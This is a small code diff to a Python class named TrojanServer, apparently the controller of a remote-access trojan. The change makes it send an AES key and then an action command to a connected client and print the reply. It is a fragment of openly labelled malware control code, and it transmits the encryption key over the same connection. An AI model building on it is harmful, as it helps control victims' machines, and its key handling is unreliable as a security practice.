@@ -40,7 +40,9 @@ class  TrojanServer:
         else:
             aes_key = self.GET_AES_KEY(conn)
         
+        protocol.send(conn, aes_key)
         protocol.send(conn, action)
+        
         response = protocol.receive(conn).decode()
         print(response)
 
